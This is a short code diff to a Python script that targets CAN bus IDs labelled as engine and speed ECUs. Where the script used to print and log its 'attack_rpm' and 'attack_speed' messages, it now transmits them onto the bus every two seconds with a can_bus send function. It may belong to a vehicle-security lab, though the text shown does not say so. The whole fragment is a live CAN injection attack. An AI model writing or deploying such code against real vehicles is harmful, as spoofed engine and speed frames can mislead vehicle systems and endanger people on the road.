@@ -5,7 +5,7 @@ import sys
 import os
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../../")))
-from logs.logger import log_message
+from can_bus import send
 
 TARGET_CAN_IDS = ["0x101", "0x102"]  # Engine + Speed ECUs
 
@@ -41,11 +41,8 @@ def main():
 
         print(json.dumps(attack_rpm, indent=2))
         print(json.dumps(attack_speed, indent=2))
-        messages = [attack_rpm, attack_speed]
-
-        for msg in messages:
-            print(json.dumps(msg, indent=2))
-            log_message(msg)   
+        send(attack_rpm)
+        send(attack_speed)
 
         print("-" * 60)
         time.sleep(2)
